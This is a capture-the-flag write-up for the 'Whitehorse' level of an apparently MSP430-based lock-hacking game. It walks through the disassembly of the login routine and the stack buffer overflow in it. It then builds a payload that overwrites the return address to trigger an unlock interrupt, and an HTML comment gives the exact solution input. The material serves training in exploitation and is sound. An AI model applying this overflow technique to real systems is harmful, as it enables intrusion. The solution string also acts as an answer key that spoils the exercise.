# Whitehorse
> partial source code is [here](./dump.asm)  
> **Vulnerability**: stack buffer overflow  
> similar to [Cusco](../Cusco/readme.md)

## Analysis
Focus on the function `<login>`
```asm
44f4 <login>
44f4:  3150 f0ff      add	#0xfff0, sp         ; sp = sp - 0x10
44f8:  3f40 7044      mov	#0x4470 "Enter the password to continue.", r15
44fc:  b012 9645      call	#0x4596 <puts>
4500:  3f40 9044      mov	#0x4490 "Remember: passwords are between 8 and 16 characters.", r15
4504:  b012 9645      call	#0x4596 <puts>
4508:  3e40 3000      mov	#0x30, r14
450c:  0f41           mov	sp, r15
450e:  b012 8645      call	#0x4586 <getsn>     ; gets(sp, 0x30)
4512:  0f41           mov	sp, r15
4514:  b012 4644      call	#0x4446 <conditional_unlock_door>
4518:  0f93           tst	r15
451a:  0324           jz	$+0x8 <login+0x2e>
451c:  3f40 c544      mov	#0x44c5 "Access granted.", r15
4520:  023c           jmp	$+0x6 <login+0x32>
4522:  3f40 d544      mov	#0x44d5 "That password is not correct.", r15
4526:  b012 9645      call	#0x4596 <puts>
452a:  3150 1000      add	#0x10, sp
452e:  3041           ret
```

At `0x4514`, it calls `<conditional_unlock_door>` and inside the function, it use the interrupt `0x7e` and user input as the first argument. `INT 0x7e`, unlike `INT 0x7f` which **unconditionally** unlocks the door, it unlocks the door only when the first argument matches the password. Therefore, we need to find the password(?).

### Vulnerability
From `44f4:  3150 f0ff      add	#0xfff0, sp`, we know that the stack size is `0x10` bytes and at `450e`, it calls `gets(sp, 0x30)` which gets **maximum 0x30 bytes** of input on the stack.

Therefore, there is a **stack buffer overflow** and `input[0x10]` will hold the return address of the function `<login>`.

Originally, in the problem [`Cusoc`](../Cusco/readme.md), we can just overwrite the return address with the address of `<unlock_door>` function. However, in this problem, we don't have a existed code segment that will call `INT 0x7f`.

**But**, we know that the value to decide what the interrupt is going to do is by the value register `sp` pointing to. Therefore, we need to put `0x7f` on to the stack.

#### Stack Layout
|             |   `gets(sp, 0x30)`   |       `0x452e`       |
| :---------: | :------------------: | :------------------: |
|    `sp`     |      (padding)       | **(return address)** |
| `sp + 0x2`  |      (padding)       |        `0x7f`        |
| `sp + 0x4`  |      (padding)       |      (garbage)       |
| `sp + 0x6`  |      (padding)       |      (garbage)       |
| `sp + 0x8`  |      (padding)       |      (garbage)       |
| `sp + 0xa`  |      (padding)       |      (garbage)       |
| `sp + 0xc`  |      (padding)       |      (garbage)       |
| `sp + 0xe`  |      (padding)       |      (garbage)       |
| `sp + 0x10` | **(return address)** |      (garbage)       |
| `sp + 0x12` |        `0x7f`        |      (garbage)       |
| `sp + 0x14` |      (garbage)       |      (garbage)       |

> The `sp @ 452e` should be `input[0x10]` because the stack size is `0x10` bytes (also, the previous instruction, `add #0x10, sp`).

The return address can be overwritten with any address that `call <INT>`.

## Exploit
0x10 bytes of padding + 0x2 bytes of address that `call <INT>`, `0x4460` in little endian + 0x2 bytes of `0x7f`

<!-- solution: {'level_id': 7, 'input': '4141414141414141414141414141414160447f;'} -->
